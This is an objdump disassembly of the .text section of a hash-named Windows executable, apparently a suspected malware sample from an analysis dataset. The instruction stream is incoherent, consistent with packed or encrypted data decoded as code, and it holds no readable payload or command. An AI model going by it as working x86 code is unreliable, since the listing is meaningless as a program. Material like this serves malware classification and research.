
d07e3ef9271e46f7eb7c660b6d946ebc18017d25eae8a617b277e71cd72bba0b.exe:     file format pei-i386


Disassembly of section .text:

00401000 <.text>:
  401000:	inc    eax
  401001:	pop    ebx
  401002:	add    DWORD PTR [edi+0x38b47dc7],ecx
  401008:	add    ecx,ecx
  40100a:	ins    DWORD PTR es:[edi],dx
  40100b:	sub    dh,BYTE PTR [edx-0x1d]
  40100e:	rol    DWORD PTR [ecx-0x3237be5e],0x16
  401015:	add    al,al
  401017:	retf   
  401018:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401019:	adc    BYTE PTR [esi-0x53],dl
  40101c:	pop    edi
  40101d:	popa   
  40101e:	out    dx,al
  40101f:	(bad)  
  401021:	sub    eax,0x80fff9da
  401026:	stos   DWORD PTR es:[edi],eax
  401027:	inc    DWORD PTR [ecx]
  401029:	xor    esp,ebx
  40102b:	add    eax,0xf2cf2def
  401030:	pop    esi
  401031:	mov    edx,0xb45ea618
  401036:	adc    eax,0x3e609964
  40103b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40103c:	pop    esi
  40103d:	lods   al,BYTE PTR ds:[esi]
  40103e:	ins    DWORD PTR es:[edi],dx
  40103f:	pop    es
  401040:	cld    
  401041:	pusha  
  401042:	out    dx,al
  401043:	mov    al,ds:0xf2c9365e
  401048:	add    al,0x3c
  40104a:	shl    BYTE PTR [ebx-0x3358cd0],cl
  401050:	add    ah,BYTE PTR [ecx-0x30]
  401053:	hlt    
  401054:	cli    
  401055:	xor    al,0xd2
  401057:	mov    esi,0xa0d234fa
  40105c:	or     esi,edx
  40105e:	push   edx
  40105f:	add    DWORD PTR [edi],ebp
  401061:	mov    eax,ds:0xd666d673
  401066:	mov    cl,0x9c
  401068:	aaa    
  401069:	cdq    
  40106a:	fstp   DWORD PTR [edx-0x96f5919]
  401070:	jno    0x401083
  401072:	jae    0x4010d4
  401074:	inc    edi
  401075:	xchg   edi,eax
  401076:	push   edi
  401077:	push   ecx
  401078:	xor    BYTE PTR [edi-0x54],bl
  40107b:	xor    esp,DWORD PTR [esi-0x70]
  40107e:	push   esi
  40107f:	hlt    
  401080:	pop    ecx
  401081:	ins    BYTE PTR es:[edi],dx
  401082:	push   cs
  401083:	and    al,0xb6
  401085:	mov    bl,0x60
  401087:	pop    esp
  401088:	jmp    0x6bbd5d3a
  40108d:	nop
  40108e:	jne    0x401075
  401090:	cmp    al,BYTE PTR [ebp-0x33]
  401093:	pop    ecx
  401094:	mov    al,ds:0xe7d5ee58
  401099:	mov    ah,0x6d
  40109b:	gs jbe 0x401040
  40109e:	pop    edi
  40109f:	jo     0x40109f
  4010a1:	cdq    
  4010a2:	imul   ebp,DWORD PTR [ecx+0x74],0x5ea15fa1
  4010a9:	popa   
  4010aa:	out    dx,al
  4010ab:	and    esi,ecx
  4010ad:	pop    eax
  4010ae:	out    dx,al
  4010af:	lahf   
  4010b0:	(bad)  
  4010b2:	out    dx,al
  4010b3:	mov    al,ds:0x98d9d65e
  4010b8:	loope  0x40109d
  4010ba:	out    dx,al
  4010bb:	outs   dx,DWORD PTR ds:[esi]
  4010bc:	jae    0x40105f
  4010be:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4010bf:	mov    eax,ds:0x3cee615d
  4010c4:	xor    ah,BYTE PTR [eax]
  4010c6:	fsub   QWORD PTR [esi-0x5d28f8ce]
  4010cc:	inc    edx
  4010cd:	rcl    DWORD PTR [ebx+ebx*4-0x260ad362],0x63
  4010d5:	(bad)  [ecx+eiz*4+0x5e]
  4010d9:	popa   
  4010da:	push   ebx
  4010db:	mov    cl,ah
  4010dd:	jmp    0x4010cd
  4010df:	outs   dx,DWORD PTR ds:[esi]
  4010e0:	jae    0x401083
  4010e2:	adc    ebp,DWORD PTR [edi-0x21]
  4010e5:	mov    eax,ds:0x36eff6ed
  4010ea:	out    dx,al
  4010eb:	(bad)  
  4010ec:	xchg   BYTE PTR ds:0xd773705f,dh
  4010f2:	imul   ebp,DWORD PTR [ebp+0x74],0xe7055fa1
  4010f9:	dec    ebx
  4010fa:	push   ds
  4010fb:	mov    eax,ds:0xd373615e
  401100:	(bad)  
  401101:	(bad)  
  401102:	mov    esp,0x5386e79c
  401107:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401108:	out    0x4e,eax
  40110a:	and    edx,DWORD PTR [edx+ebp*8+0x12]
  40110e:	jae    0x401103
  401110:	cs aam 0xa1
  401113:	mov    eax,ds:0x2a5fa173
  401118:	pop    esi
  401119:	pusha  
  40111a:	out    dx,al
  40111b:	mov    al,ds:0x78daab67
  401120:	cld    
  401121:	repz and ah,dl
  401124:	lock pop edx
  401126:	and    cl,bl
  401128:	jmp    0x401188
  40112a:	adc    al,BYTE PTR [ecx-0xad1a938]
  401130:	pop    ecx
  401131:	sbb    dl,bl
  401133:	push   esp
  401134:	xchg   DWORD PTR [esi-0x5da1c98f],esi
  40113a:	pop    edi
  40113b:	jo     0x401184
  40113d:	mov    ds:0x2b5d706b,eax
  401142:	sub    ebx,edi
  401144:	pop    esi
  401145:	or     edx,DWORD PTR [esi-0x6e]
  401148:	jae    0x4010eb
  40114a:	pop    edi
  40114b:	lods   al,BYTE PTR ds:[esi]
  40114c:	fldenv [eax+eiz*2-0x66d48c90]
  401153:	sbb    al,0x20
  401155:	dec    ecx
  401156:	jne    0x40117e
  401158:	jbe    0x4010fc
  40115a:	pop    edi
  40115b:	jo     0x40115a
  40115d:	aad    0x69
  40115f:	imul   esi,DWORD PTR [ecx+eiz*4+0x5f],0xee5ca05a
  401167:	aad    0xe7
  401169:	mov    ah,0x1b
  40116b:	popa   
  40116c:	(bad)  
  40116d:	addr16 test eax,0x7316ea98
  401173:	into   
  401174:	pop    si
  401176:	ret    
  401177:	lods   al,BYTE PTR ds:[esi]
  401178:	out    0x5,eax
  40117a:	out    0xa3,al
  40117c:	adc    DWORD PTR [ecx+0x73],ebx
  40117f:	hlt    
  401180:	ds pop esi
  401182:	fstp   DWORD PTR [eax-0x2bdc70d1]
  401188:	push   esi
  401189:	cs sbb eax,0xf61c5f3e
  40118f:	cli    
  401190:	pop    esi
  401191:	adc    DWORD PTR [esi+0x66],edx
  401194:	je     0x401137
  401196:	pop    edi
  401197:	stos   BYTE PTR es:[edi],al
  401198:	sbb    DWORD PTR [ebp-0x26],edx
  40119b:	mov    ds:0x5247b620,eax
  4011a0:	sbb    BYTE PTR [ebp-0x45],0xc4
  4011a4:	pop    edi
  4011a5:	or     al,0xf6
  4011a7:	lahf   
  4011a8:	stos   DWORD PTR es:[edi],eax
  4011a9:	pop    esi
  4011aa:	sub    eax,0xab5e6081
  4011af:	mov    WORD PTR [edi+0x1c],ds
  4011b2:	neg    BYTE PTR [ebx]
  4011b4:	pop    esi
  4011b5:	pop    esi
  4011b6:	test   eax,0xa1ce598
  4011bb:	(bad)  
  4011bc:	std    
  4011bd:	xchg   edi,eax
  4011be:	sub    al,0x99
  4011c0:	pop    esi
  4011c1:	or     al,0x73
  4011c3:	jge    0x401238
  4011c5:	sub    esi,edx
  4011c7:	outs   dx,DWORD PTR ds:[esi]
  4011c8:	jmp    0x73496825
  4011cd:	mov    eax,ds:0x5cdb5a5f
  4011d2:	or     ch,BYTE PTR [eax]
  4011d4:	sbb    bh,BYTE PTR [ebp-0xa]
  4011d7:	bound  ebx,QWORD PTR [edx+0x61]
  4011da:	mov    ecx,0x2add821b
  4011df:	jge    0x4011df
  4011e1:	mov    eax,0x615ea0ee
  4011e6:	ins    DWORD PTR es:[edi],dx
  4011e7:	mov    ebp,0xe0fbcf3a
  4011ec:	pop    esi
  4011ed:	push   es
  4011ee:	jno    0x401214
  4011f0:	je     0x401241
  4011f2:	scas   al,BYTE PTR es:[edi]
  4011f3:	mov    al,ds:0x6f81b90e
  4011f8:	jae    0x40119b
  4011fa:	jne    0x4011e2
  4011fc:	jb     0x401236
  4011fe:	aaa    
  4011ff:	icebp  
  401200:	mov    edx,0x72f65f69
  401205:	mov    eax,0xa1736fc1
  40120a:	jne    0x4011f2
  40120c:	jbe    0x401246
  40120e:	mov    ah,0x11
  401210:	retf   
  401211:	test   eax,0xb872f65f
  401216:	mov    cl,0x6f
  401218:	jae    0x4011bb
  40121a:	jne    0x401202
  40121c:	push   0xffffffd5
  40121e:	test   eax,0x22215f6c
  401223:	mov    al,ds:0x1dfa10ab
  401228:	sbb    bl,BYTE PTR [edi+0x6]
  40122b:	sbb    al,0xe
  40122d:	push   ebp
  40122e:	jmp    0x401205
  401230:	jb     0x401209
  401232:	mov    ecx,0xfe115f70
  401237:	sbb    DWORD PTR [ecx],ecx
  401239:	mov    ch,0x73
  40123b:	out    dx,al
  40123c:	adc    ch,0xd9
  40123f:	jo     0x401278
  401241:	stos   BYTE PTR es:[edi],al
  401242:	fiadd  DWORD PTR ds:0xf65664c2
  401248:	imul   edx,ebp,0xffffffe8
  40124b:	sbb    eax,0xabea711a
  401250:	sbb    DWORD PTR [ecx-0x7f4a8327],ebp
  401256:	out    dx,al
  401257:	mov    al,ds:0x6db8d45e
  40125c:	sub    BYTE PTR [ebx],bh
  40125e:	ins    DWORD PTR es:[edi],dx
  40125f:	stos   DWORD PTR es:[edi],eax
  401260:	or     BYTE PTR [eax-0x26],bl
  401263:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401264:	sub    BYTE PTR [edx-0x1ed7b6ad],0x24
  40126b:	jns    0x401256
  40126d:	dec    eax
  40126e:	jae    0x40124b
  401270:	pop    ebp
  401271:	aam    0xb2
  401273:	xchg   ecx,eax
  401274:	pop    ecx
  401275:	data16 mov cl,0x70
  401278:	lock push esp
  40127a:	and    ebx,esi
  40127c:	sub    BYTE PTR ds:0xad21abe7,0xda
  401283:	mov    ds:0xab6de687,al
  401288:	into   
  401289:	sar    BYTE PTR [esi+0x11],1
  40128c:	jmp    0x5eb1:0x39a3734a
  401293:	jno    0x401303
  401295:	arpl   WORD PTR [esi-0x26eef130],di
  40129b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40129c:	fisub  WORD PTR [esi]
  40129e:	pusha  
  40129f:	jl     0x40128b
  4012a1:	pop    ebx
  4012a2:	push   ebx
  4012a3:	fistp  WORD PTR gs:[esi+0x3f906fea]
  4012aa:	xor    eax,0xb9615a63
  4012af:	sbb    eax,DWORD PTR [edx+0x62f67340]
  4012b5:	(bad)  
  4012b6:	loope  0x401250
  4012b8:	jb     0x4012a8
  4012ba:	outs   dx,BYTE PTR ds:[esi]
  4012bb:	mov    ah,0x97
  4012bd:	cld    
  4012be:	fwait
  4012bf:	mov    ds:0xa0ee3386,eax
  4012c4:	pop    esi
  4012c5:	cs pop eax
  4012c7:	mov    ah,0xa5
  4012c9:	mov    eax,0x615ea0ca
  4012ce:	fisttp DWORD PTR [edi+ebp*1+0x5ecc56a1]
  4012d5:	popa   
  4012d6:	out    dx,al
  4012d7:	repz aas 
  4012d9:	out    dx,al
  4012da:	in     al,dx
  4012db:	loope  0x40128b
  4012dd:	push   eax
  4012de:	push   esi
  4012df:	loopne 0x40133f
  4012e1:	popa   
  4012e2:	out    dx,al
  4012e3:	xchg   edx,eax
  4012e4:	sahf   
  4012e5:	sub    eax,0xf733f657
  4012ea:	push   ebx
  4012eb:	push   ebp
  4012ec:	xchg   BYTE PTR [ebx],dl
  4012ee:	out    dx,al
  4012ef:	mov    al,ds:0xf633765e
  4012f4:	dec    esi
  4012f5:	mov    ecx,0x615ea0ac
  4012fa:	push   ebx
  4012fb:	mov    ecx,0xf5568fc2
  401300:	and    DWORD PTR [esi+0x35],ecx
  401303:	jl     0x401357
  401305:	shl    BYTE PTR [esi-0x6da7819f],1
  40130b:	jns    0x40134f
  40130d:	popa   
  40130e:	out    dx,al
  40130f:	mov    al,ds:0xa0e16131
  401314:	pop    esi
  401315:	cs hlt 
  401317:	and    BYTE PTR [edx+0x5b],dh
  40131a:	(bad)  [esi-0x8205721]
  401320:	pusha  
  401321:	and    BYTE PTR [ebp-0x646418eb],ch
  401327:	mov    ds:0xbc57d60c,al
  40132c:	outs   dx,BYTE PTR ds:[esi]
  40132d:	lods   eax,DWORD PTR ds:[esi]
  40132e:	mov    cl,bh
  401330:	xchg   edx,edx
  401332:	in     al,dx
  401333:	push   edx
  401334:	jmp    0x1cd78794
  401339:	dec    edi
  40133a:	cmp    al,0x64
  40133c:	das    
  40133d:	cwde   
  40133e:	lods   eax,DWORD PTR ds:[esi]
  40133f:	js     0x4012c5
  401341:	mov    eax,ds:0x984f705f
  401346:	push   esi
  401347:	mov    BYTE PTR [ebx-0x5f],dh
  40134a:	pop    edi
  40134b:	repz jo 0x4012eb
  40134e:	adc    ebp,ebp
  401350:	cmp    bh,BYTE PTR [ecx+0x75]
  401353:	in     eax,dx
  401354:	cmp    al,BYTE PTR [ebp-0x33]
  401357:	pop    ecx
  401358:	mov    al,ds:0xe7d5ee58
  40135d:	mov    ah,0x6b
  40135f:	outs   dx,BYTE PTR gs:[esi]
  401361:	inc    eax
  401362:	jae    0x40134a
  401364:	data16 jl 0x401355
  401367:	jo     0x4013dc
  401369:	mov    eax,ds:0x143621c8
  40136e:	(bad)  
  40136f:	cmc    
  401370:	dec    edi
  401371:	(bad)  
  401372:	mov    esi,0xeea6ddac
  401377:	nop
  401378:	pop    esi
  401379:	popa   
  40137a:	fistp  DWORD PTR [eax-0x5cdd2004]
  401380:	push   cs
  401381:	sbb    al,0xda
  401383:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401384:	inc    ecx
  401385:	popa   
  401386:	(bad)  
  401387:	mov    al,ds:0x1a3fb65e
  40138c:	sbb    DWORD PTR [ecx+0x56],ebx
  40138f:	mov    eax,ds:0x21ee615e
  401394:	inc    edx
  401395:	jge    0x4013b6
  401397:	xchg   esi,eax
  401398:	push   ds
  401399:	popa   
  40139a:	ret    
  40139b:	sbb    eax,0xe0fdafdf
  4013a0:	pop    esi
  4013a1:	adc    DWORD PTR [esi+0x71],edx
  4013a4:	jb     0x401347
  4013a6:	pop    edi
  4013a7:	sbb    bl,BYTE PTR [ecx]
  4013a9:	mov    cl,0xa5
  4013ab:	mov    ecx,0xa3ee615c
  4013b0:	out    0x83,eax
  4013b2:	std    
  4013b3:	loopne 0x401413
  4013b5:	fdiv   DWORD PTR [ecx-0x29def798]
  4013bb:	mov    al,ds:0xd1ee612e
  4013c0:	or     BYTE PTR [ecx-0x2a],ah
  4013c3:	fisub  DWORD PTR [ecx-0x6d]
  4013c6:	cmc    
  4013c7:	outs   dx,DWORD PTR ds:[esi]
  4013c8:	jmp    0x71b36a7d
  4013cd:	mov    eax,ds:0xa5191a5f
  4013d2:	jno    0x401408
  4013d4:	sahf   
  4013d5:	dec    edi
  4013d6:	scas   al,BYTE PTR es:[edi]
  4013d7:	mov    al,ds:0x1c6223e7
  4013dc:	and    DWORD PTR [ecx-0x7cb8b015],ebp
  4013e2:	pop    ebx
  4013e3:	inc    ebp
  4013e4:	loope  0x4013c3
  4013e6:	xchg   BYTE PTR [esi-0x7ea09ee2],dl
  4013ec:	loope  0x4013db
  4013ee:	push   esi
  4013ef:	cwde   
  4013f0:	push   ds
  4013f1:	popa   
  4013f2:	pop    edi
  4013f3:	xor    al,0x91
  4013f5:	dec    edi
  4013f6:	scas   al,BYTE PTR es:[edi]
  4013f7:	mov    al,ds:0x6cc0b90c
  4013fc:	jae    0x40139f
  4013fe:	and    esp,DWORD PTR [edi*2+0x63a0ae4f]
  401405:	fmul   QWORD PTR [ebx]
  401407:	mov    ds:0x345f615e,eax
  40140c:	jns    0x40145d
  40140e:	scas   al,BYTE PTR es:[edi]
  40140f:	mov    al,ds:0xb1d62108
  401414:	jmp    0x56b0:0xe96fdfe4
  40141b:	inc    ebx
  40141c:	jno    0x4013bf
  40141e:	pop    edi
  40141f:	sbb    bl,BYTE PTR [ecx]
  401421:	lods   eax,DWORD PTR ds:[esi]
  401422:	repz pusha 
  401424:	arpl   bp,bx
  401426:	jmp    0x4013ca
  401428:	pop    esi
  401429:	popa   
  40142a:	jae    0x401495
  40142c:	or     al,0xa
  40142e:	push   esi
  40142f:	in     al,dx
  401430:	je     0x4013d3
  401432:	pop    edi
  401433:	lods   al,BYTE PTR ds:[esi]
  401434:	fistp  QWORD PTR [ebx+0x525ee0fd]
  40143a:	imul   edi,DWORD PTR [edi+0x5d],0xbd0ee61
  401441:	mov    ecx,0xa1736cf8
  401446:	and    esp,DWORD PTR [eax*4+0x63a0ae4f]
  40144d:	fadd   QWORD PTR [ebx-0x5e]
  401450:	pop    esi
  401451:	popa   
  401452:	jae    0x40144a
  401454:	data16 (bad) 
  401456:	loope  0x4014cc
  401458:	mov    ch,0x64
  40145a:	out    dx,al
  40145b:	mov    al,ds:0xa9f2685e
  401460:	lock pop esi
  401462:	pop    ebx
  401463:	inc    ebp
  401464:	out    0x2b,eax
  401466:	neg    BYTE PTR [ebx]
  401468:	icebp  
  401469:	lods   al,BYTE PTR ds:[esi]
  40146a:	jmp    0x40145b
  40146c:	xor    bl,BYTE PTR [esi-0x28]
  40146f:	lods   al,BYTE PTR ds:[esi]
  401470:	cld    
  401471:	aad    0xa8
  401473:	xchg   esi,eax
  401474:	cld    
  401475:	xlat   BYTE PTR ds:[ebx]
  401476:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401477:	xchg   esi,eax
  401478:	out    0x13,eax
  40147a:	pop    edx
  40147b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40147c:	and    eax,0xaa0d465
  401481:	aaa    
  401482:	scas   al,BYTE PTR es:[edi]
  401483:	outs   dx,DWORD PTR ds:[esi]
  401484:	in     eax,dx
  401485:	adc    BYTE PTR [edi-0xa],bl
  401488:	cmp    WORD PTR [edi],cx
  40148b:	add    BYTE PTR [ecx+edx*2+0x5f],bl
  40148f:	imul   BYTE PTR [esi-0x48]
  401492:	adc    ebp,DWORD PTR [esi+0x73]
  401495:	mov    eax,ds:0x58f11bc6
  40149a:	jae    0x401492
  40149c:	push   0xffffffd5
  40149e:	xor    BYTE PTR [esp+0xada7365],ah
  4014a5:	scas   al,BYTE PTR es:[edi]
  4014a6:	mov    bl,BYTE PTR [ecx+edx*1]
  4014a9:	pop    ecx
  4014aa:	jmp    0x401477
  4014ac:	xor    dl,BYTE PTR [edx-0x69]
  4014af:	fcomp  QWORD PTR [edx+edx*2-0x69]
  4014b3:	hlt    
  4014b4:	dec    edx
  4014b5:	aam    0xda
  4014b7:	mov    ss,WORD PTR [esi+0xb]
  4014ba:	mov    ebp,0xeb58f11b
  4014bf:	out    dx,al
  4014c0:	(bad)  
  4014c1:	(bad)  
  4014c2:	mov    al,0x98
  4014c4:	out    0x1d,eax
  4014c6:	fstp   DWORD PTR es:[edi-0x67]
  4014ca:	push   edi
  4014cb:	push   ecx
  4014cc:	aas    
  4014cd:	cdq    
  4014ce:	sub    eax,0x2e6e607a
  4014d3:	je     0x40149c
  4014d5:	aad    0xb0
  4014d7:	nop
  4014d8:	out    0x22,eax
  4014da:	repnz sbb ebp,esp
  4014dd:	dec    esp
  4014de:	jmp    0x4014d5
  4014e0:	push   0x5d
  4014e2:	loope  0x40147c
  4014e4:	outs   dx,DWORD PTR ds:[esi]
  4014e5:	cld    
  4014e6:	(bad)
  4014e9:	call   0x74d9:0xa1a28316
  4014f0:	push   es
  4014f1:	les    eax,FWORD PTR [eax]
  4014f3:	cld    
  4014f4:	jmp    DWORD PTR [ecx-0x63798f27]
  4014fa:	bound  esi,QWORD PTR [eax+0x73]
  4014fd:	aad    0x73
  4014ff:	and    eax,0x83ee615e
  401504:	pop    es
  401505:	(bad)  
  401506:	and    DWORD PTR [ecx],0x5e
  401509:	popa   
  40150a:	out    dx,al
  40150b:	mov    ds:0xf4735911,eax
  401510:	bound  edx,QWORD PTR [esi+0x58]
  401513:	cmc    
  401514:	pop    ss
  401515:	pop    esi
  401516:	fstp   DWORD PTR [eax+0x6be5b90c]
  40151c:	jae    0x4014bf
  40151e:	repz pusha 
  401520:	jmp    0xe238cd73
  401525:	jecxz  0x401554
  401527:	mov    al,0x73
  401529:	sub    ebx,DWORD PTR [esi+0x79]
  40152c:	int    0xa4
  40152e:	pop    edi
  40152f:	jo     0x401598
  401531:	mov    eax,ds:0x90e7b7da
  401536:	jae    0x401524
  401538:	dec    esi
  401539:	(bad)  
  40153a:	sbb    ebx,DWORD PTR [esp+ebp*2+0x6b1bec2b]
  401541:	pop    ebp
  401542:	fstp   DWORD PTR [eax+0x3df6245f]
  401548:	addr16 mov eax,ds:0x8fda
  40154c:	arpl   di,sp
  40154e:	pop    esi
  40154f:	nop
  401550:	lock pop ebx
  401552:	jmp    0x401539
  401554:	and    WORD PTR [esi-0x29f0f12e],bp
  40155b:	outs   dx,DWORD PTR ds:[esi]
  40155c:	push   ebx
  40155d:	and    eax,0xb0e97035
  401562:	push   esi
  401563:	retf   
  401564:	jb     0x401507
  401566:	pop    edi
  401567:	retf   
  401568:	(bad)  
  401569:	mov    ch,0x42
  40156b:	and    al,0x9f
  40156d:	dec    esp
  40156e:	push   ebx
  40156f:	movntq QWORD PTR [ebx],mm1
  401572:	neg    BYTE PTR [ebx]
  401574:	adc    DWORD PTR [ecx-0x15],ebx
  401577:	retf   
  401578:	xor    dh,BYTE PTR [esi-0x45]
  40157b:	mov    ah,0xea
  40157d:	adc    al,cl
  40157f:	lahf   
  401580:	mov    eax,0xf0a0f83d
  401585:	sbb    BYTE PTR [ebx+0x2c],ch
  401588:	mov    edx,0x5ea0ee60
  40158d:	sub    eax,0x58e91c1f
  401592:	jmp    0x4015c7
  401594:	mov    esi,0xe7a0ee60
  401599:	(bad)  
  40159a:	jmp    0x401589
  40159c:	data16 (bad) 
  40159e:	mov    al,0xa4
  4015a0:	fbstp  TBYTE PTR [edi-0x427aae0a]
  4015a6:	pop    es
  4015a7:	sar    DWORD PTR ds:[edx],0x91
  4015ab:	pop    es
  4015ac:	lds    esp,FWORD PTR [eax+0x1e]
  4015af:	cmc    
  4015b0:	data16 jl 0x401612
  4015b3:	mov    al,ds:0x94ed615e
  4015b8:	ss mov edi,0x59191c50
  4015be:	jmp    0x4015e3
  4015c0:	mov    esi,0x5fa0ee60
  4015c5:	fimul  WORD PTR [edx+0x23615ea1]
  4015cb:	jno    0x4015bd
  4015cd:	xchg   esi,eax
  4015ce:	jae    0x4015ec
  4015d0:	call   0x5f58:0x7fa0ee60
  4015d7:	mul    BYTE PTR [esi-0x47]
  4015da:	bound  ebp,QWORD PTR [ebx+esi*2-0x5f]
  4015de:	retf   0x2e41
  4015e1:	popa   
  4015e2:	out    dx,al
  4015e3:	mov    al,ds:0x1bf220e7
  4015e8:	push   ds
  4015e9:	push   ebp
  4015ea:	jae    0x4015c5
  4015ec:	push   esi
  4015ed:	(bad)  
  4015ee:	mov    ecx,0x6113598
  4015f3:	cmc    
  4015f4:	gs (bad) 
  4015f6:	out    dx,al
  4015f7:	test   eax,0x74d94926
  4015fc:	xchg   DWORD PTR [ecx+0x73],esi
  4015ff:	fadd   QWORD PTR [esi+0x5e]
  401602:	mov    cl,0x98
  401604:	in     eax,0x18
  401606:	add    bl,BYTE PTR [edx]
  401608:	and    DWORD PTR [ebp+0x27],ebx
  40160b:	loope  0x40164b
  40160d:	pusha  
  40160e:	out    dx,al
  40160f:	mov    al,ds:0xe4573b5e
  401614:	dec    esp
  401615:	popa   
  401616:	push   cs
  401617:	neg    BYTE PTR [ebx-0x66]
  40161a:	test   eax,0xee615e90
  40161f:	mov    al,ds:0x8d0a1c9b
  401624:	pop    esi
  401625:	popa   
  401626:	out    dx,al
  401627:	mov    al,ds:0xa52c97fd
  40162c:	pop    esi
  40162d:	aaa    
  40162e:	out    dx,al
  40162f:	clc    
  401630:	mov    ds:0x73c5fec9,al
  401635:	sub    ebx,DWORD PTR [esi+0x79]
  401638:	fldenv [ebp+0x6921705f]
  40163e:	les    edx,FWORD PTR [eax]
  401640:	ss pop esi
  401642:	enter  0x5aa2,0x58
  401646:	(bad)  [edi-0x23]
  401649:	call   0x219d287a
  40164e:	sub    al,0x96
  401650:	lahf   
  401651:	pop    eax
  401652:	in     eax,dx
  401653:	sahf   
  401654:	push   bx
  401656:	jmp    FWORD PTR [edx]
  401658:	repnz pop edi
  40165a:	call   0x2276:0xa67fa19a
  401661:	loope  0x401657
  401663:	aam    0x6
  401665:	cmp    bl,bl
  401667:	shr    dh,0x44
  40166a:	fdiv   st(7),st
  40166c:	sti    
  40166d:	xchg   ecx,eax
  40166e:	int    0xfd
  401670:	fs ds jo 0x401673
  401674:	xor    al,0xc2
  401676:	ficomp DWORD PTR [edi+0x0]
  401679:	cmp    al,0xbf
  40167b:	push   cs
  40167c:	jmp    0x5d3a3562
  401681:	sbb    eax,0x3372d3af
  401686:	out    0xff,eax
  401688:	cli    
  401689:	cmp    edx,DWORD PTR [eax]
  40168b:	sahf   
  40168c:	push   eax
  40168d:	push   edi
  40168e:	or     cl,BYTE PTR [ecx]
  401690:	sbb    ch,BYTE PTR ds:0xa61ea2e8
  401696:	push   ds
  401697:	or     BYTE PTR [ecx+edi*8-0x62],al
  40169b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40169c:	inc    edi
  40169d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40169e:	loop   0x4016d0
  4016a0:	or     bh,BYTE PTR [eax-0xa]
  4016a3:	and    al,0x76
  4016a5:	push   ss
  4016a6:	push   0x21cd9ed
  4016ab:	rcr    BYTE PTR [esi],1
  4016ad:	push   eax
  4016ae:	sbb    DWORD PTR [ecx],ebx
  4016b0:	xor    eax,0x663dd642
  4016b5:	pop    ecx
  4016b6:	jg     0x4016e6
  4016b8:	dec    ecx
  4016b9:	je     0x4016d5
  4016bb:	scas   eax,DWORD PTR es:[edi]
  4016bc:	inc    ebx
  4016bd:	es int 0x6
  4016c0:	dec    esi
  4016c1:	xchg   ebp,eax
  4016c2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4016c3:	lods   al,BYTE PTR ds:[esi]
  4016c4:	ins    DWORD PTR es:[edi],dx
  4016c5:	bound  edi,QWORD PTR [ebx-0x1c412250]
  4016cb:	inc    edi
  4016cc:	in     ax,dx
  4016ce:	sub    dh,BYTE PTR [edx-0x2cf911d0]
  4016d4:	add    eax,0xfef8cb79
  4016d9:	shl    DWORD PTR [edx],cl
  4016db:	jecxz  0x4016eb
  4016dd:	sbb    al,0xec
  4016df:	fcomp  QWORD PTR [ebp+0x21]
  4016e2:	hlt    
  4016e3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4016e4:	clc    
  4016e5:	jne    0x401742
  4016e7:	loopne 0x401733
  4016e9:	inc    ebp
  4016ea:	dec    esi
  4016eb:	test   al,0x60
  4016ed:	pusha  
  4016ee:	repz (bad) 
  4016f0:	push   0x5404b54f
  4016f5:	dec    esp
  4016f6:	dec    edx
  4016f7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4016f8:	dec    edx
  4016f9:	dec    eax
  4016fa:	cmp    DWORD PTR [ebp+0x67],eax
  4016fd:	push   ecx
  4016fe:	jne    0x40169a
  401700:	ficomp WORD PTR [esp+ebx*1-0x39]
  401704:	pop    esp
  401705:	push   ebp
  401706:	in     al,dx
  401707:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401708:	out    dx,al
  401709:	pop    ebx
  40170a:	jl     0x4016aa
  40170c:	jge    0x401724
  40170e:	test   BYTE PTR [eax+edi*8],0x55
  401712:	jb     0x4016ea
  401714:	ss jo  0x401780
  401717:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401718:	xor    esp,DWORD PTR [ecx]
  40171a:	ins    DWORD PTR es:[edi],dx
  40171b:	inc    edx
  40171c:	pcmpeqw mm1,QWORD PTR [ebx]
  40171f:	cdq    
  401720:	stos   BYTE PTR es:[edi],al
  401721:	push   ecx
  401722:	and    ah,BYTE PTR [ecx]
  401724:	add    bh,BYTE PTR ds:0xd89d01a6
  40172a:	jne    0x40176d
  40172c:	cdq    
  40172d:	push   eax
  40172e:	xchg   ebx,eax
  40172f:	cwde   
  401730:	inc    ebx
  401731:	add    BYTE PTR [ecx+edx*2],bl
  401734:	cs dec ecx
  401736:	imul   ebp,DWORD PTR [ebx-0xaeefea3],0x81e62df9
  401740:	dec    ebp
  401741:	shl    ebx,1
  401743:	enter  0xcd,0xbc
  401747:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401748:	mov    dh,0x10
  40174a:	(bad)  
  40174b:	jecxz  0x401787
  40174d:	outs   dx,DWORD PTR ds:[esi]
  40174e:	mov    edx,0xab80799a
  401753:	pop    esi
  401754:	inc    esp
  401755:	das    
  401756:	fist   DWORD PTR [edx]
  401758:	(bad)  
  401759:	fcomi  st,st(1)
  40175b:	mov    al,0xfb
  40175d:	cld    
  40175e:	jmp    0x66fd:0xeafd1aba
  401765:	jns    0x401730
  401767:	xchg   edx,eax
  401768:	add    dh,BYTE PTR [edx]
  40176a:	retf   
  40176b:	add    al,0x4a
  40176d:	adc    DWORD PTR [edx+0x1692e899],ebx
  401773:	push   edx
  401774:	push   ds
  401775:	pop    esi
  401776:	cs or  BYTE PTR es:[eax-0x5d],ah
  40177b:	xchg   ebx,eax
  40177c:	into   
  40177d:	outs   dx,DWORD PTR ds:[esi]
  40177e:	cmc    
  40177f:	inc    esp
  401780:	inc    ebx
  401781:	dec    ecx
  401782:	fs mov ebx,0xf54460c0
  401788:	mov    cl,0x11
  40178a:	mov    ah,0x53
  40178c:	(bad)  
  40178d:	imul   eax,DWORD PTR [ecx],0xe7ede747
  401793:	push   esi
  401794:	push   ss
  401795:	jmp    0x4017c5
